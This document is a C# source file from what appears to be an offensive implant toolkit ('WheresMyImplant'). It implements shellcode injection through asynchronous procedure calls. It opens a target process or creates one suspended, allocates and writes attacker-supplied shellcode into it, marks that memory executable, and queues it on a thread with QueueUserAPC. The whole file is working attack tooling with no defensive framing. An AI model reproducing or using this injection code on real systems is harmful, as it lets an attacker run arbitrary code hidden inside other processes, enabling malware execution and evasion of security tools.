using System;
using System.Runtime.InteropServices;

using MonkeyWorks.Unmanaged.Headers;
using MonkeyWorks.Unmanaged.Libraries;

namespace WheresMyImplant
{
    class InjectShellCodeRemoteAPC : IDisposable
    {
        private IntPtr hProcess = IntPtr.Zero;
        private IntPtr hThread = IntPtr.Zero;
        private IntPtr hAlloc = IntPtr.Zero;
        private UInt32 pid = 0;
        private IntPtr hSnapshot = IntPtr.Zero;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern UInt32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, ref Int32 dwData);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern UInt32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        internal InjectShellCodeRemoteAPC()
        {

        }

        internal Boolean OpenProcess(UInt32 pid)
        {
            hProcess = kernel32.OpenProcess(ProcessThreadsApi.ProcessSecurityRights.PROCESS_VM_WRITE | ProcessThreadsApi.ProcessSecurityRights.PROCESS_VM_OPERATION, false, pid);
            if (IntPtr.Zero == hProcess)
            {
                Console.WriteLine("[-] Unable to Open Process");
                return false;
            }
            Console.WriteLine("[*] Opened {0} with Handle 0x{1}", pid, hProcess.ToString("X4"));
            return true;
        }

        internal Boolean WriteShellCode(String strShellCode)
        {
            Char DELIMITER = ',';

            String[] shellCodeArray = strShellCode.Split(DELIMITER);
            Byte[] bShellCode = new Byte[shellCodeArray.Length];
            for (Int32 i = 0; i < shellCodeArray.Length; i++)
            {
                Int32 value = (Int32)new System.ComponentModel.Int32Converter().ConvertFromString(shellCodeArray[i].Trim());
                bShellCode[i] = Convert.ToByte(value);
            }
            return WriteShellCode(bShellCode);
        }

        internal Boolean WriteShellCode(Byte[] bShellCode)
        {
            hAlloc = kernel32.VirtualAllocEx(hProcess, IntPtr.Zero, (UInt32)bShellCode.Length, kernel32.MEM_RESERVE | kernel32.MEM_COMMIT, Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_READWRITE);
            if (IntPtr.Zero == hAlloc)
            {
                Console.WriteLine("[-] Unable to Allocate Memory");
                return false;
            }
            Console.WriteLine("[+] Allocated Memory at 0x{0}", hAlloc.ToString("X4"));

            UInt32 bytesWritten = 0;
            if (!kernel32.WriteProcessMemory(hProcess, hAlloc, bShellCode, (UInt32)bShellCode.Length, ref bytesWritten))
            {
                Console.WriteLine("[-] Unable to Write Memory");
                return false;
            }
            Console.WriteLine("[+] Wrote {0} Bytes", bytesWritten);

            Winnt.MEMORY_PROTECTION_CONSTANTS oldProtect = Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_NOACCESS;
            if (!kernel32.VirtualProtectEx(hProcess, hAlloc, (UInt32)bShellCode.Length, Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READ, ref oldProtect))
            {
                Console.WriteLine("[-] Unable to Allocate Memory");
                return false;
            }
            Console.WriteLine("[+] Set Memory to {0} ", Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READ);

            return true;
        }

        internal Boolean CreateProcessAndInject(String process, String strShellCode)
        {
            Winbase._SECURITY_ATTRIBUTES processAttributes = new Winbase._SECURITY_ATTRIBUTES();
            processAttributes.nLength = (UInt32)Marshal.SizeOf(typeof(Winbase._SECURITY_ATTRIBUTES));
            Winbase._SECURITY_ATTRIBUTES threadAttributes = new Winbase._SECURITY_ATTRIBUTES();
            threadAttributes.nLength = (UInt32)Marshal.SizeOf(typeof(Winbase._SECURITY_ATTRIBUTES));
            Winbase._STARTUPINFO startupInfo = new Winbase._STARTUPINFO();

            String lpCommandLine = Misc.FindFilePath(process);
            Console.WriteLine("[*] Using {0}", lpCommandLine);
            if (!kernel32.CreateProcess(lpCommandLine, lpCommandLine, ref processAttributes, ref threadAttributes, false, Winbase.CREATION_FLAGS.CREATE_SUSPENDED, IntPtr.Zero, null, ref startupInfo, out Winbase._PROCESS_INFORMATION processInformation))
            {
                Console.WriteLine("[-] Failed to Create Process {0}", process);
                return false;
            }
            hProcess = processInformation.hProcess;
            Console.WriteLine("[+] Created Process {0} (1)", processInformation.hProcess, process);

            if (!WriteShellCode(strShellCode))
                return false;

            if (0 != QueueUserAPC(hAlloc, processInformation.hThread, IntPtr.Zero))
            {
                Console.WriteLine("[+] APC Started");
                if (-1 == kernel32.ResumeThread(processInformation.hThread))
                {
                    Console.WriteLine("[-] Failed to Resume Thread");
                    return false;
                }
                return true;
            }
            Console.WriteLine("[-] APC Failed");

            return false;
        }

        internal Boolean CreateThread()
        {
            hSnapshot = kernel32.CreateToolhelp32Snapshot(TiHelp32.TH32CS_SNAPTHREAD, pid);
            if (IntPtr.Zero == hSnapshot)
            {
                Console.WriteLine("[-] Unable to Create Snapshot");
                return false;
            }

            var lpte = new TiHelp32.tagTHREADENTRY32();
            lpte.dwSize = (UInt32)Marshal.SizeOf(typeof(TiHelp32.tagTHREADENTRY32));
            Console.WriteLine("[*] Searching For Suitable Thread");

            if (!kernel32.Thread32First(hSnapshot, ref lpte))
            {
                Console.WriteLine("[-] Iteration Start Failed");
                return false;
            }

            do
            {
                hThread = kernel32.OpenThread(ProcessThreadsApi.ThreadSecurityRights.THREAD_SET_CONTEXT | ProcessThreadsApi.ThreadSecurityRights.THREAD_SUSPEND_RESUME, false, lpte.th32ThreadID);
                if (IntPtr.Zero != hThread)
                {
                    if (kernel32.WAIT_ABANDONED != kernel32.WaitForSingleObject(hThread, 0))
                    {
                        kernel32.CloseHandle(hThread);
                        continue;
                    }

                    Console.WriteLine("[*] Using Thread ID {0}", lpte.th32ThreadID);
                    if (0 != QueueUserAPC(hAlloc, hThread, IntPtr.Zero))
                    {
                        Console.WriteLine("[+] APC Started");
                        if (-1 == kernel32.ResumeThread(hThread))
                        {
                            Console.WriteLine("[-] Failed to Resume Thread");
                            kernel32.CloseHandle(hThread);
                            continue;
                        }
                        return true;
                    }
                    kernel32.CloseHandle(hThread);
                }
            }
            while (kernel32.Thread32Next(hSnapshot, ref lpte));
            Console.WriteLine("[-] No Candidates Found");
            return false;
        }

        public void Dispose()
        {
            if (IntPtr.Zero != hProcess)
                kernel32.CloseHandle(hProcess);

            if (IntPtr.Zero != hSnapshot)
                kernel32.CloseHandle(hSnapshot);

            if (IntPtr.Zero != hThread)
                kernel32.CloseHandle(hThread);
        }

        ~InjectShellCodeRemoteAPC()
        {
            Dispose();
        }
    }
}
